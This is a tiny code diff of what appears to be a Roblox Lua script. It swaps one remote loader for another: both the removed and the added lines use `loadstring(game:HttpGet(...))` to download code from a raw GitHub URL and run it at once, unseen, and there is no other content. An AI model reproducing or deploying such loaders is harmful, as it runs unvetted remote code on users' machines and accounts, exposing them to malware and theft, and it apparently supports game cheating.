@@ -1,5 +1,2 @@
 print("https://github.com/StrixMacine/Main/master/sad2asfseaw35q34")
-
-
-        repeat wait(.1) until game:GetService('Players').LocalPlayer
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Carrier101/Polyurgous/main/Hub"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xcrobix/X/refs/heads/main/3rd"))();
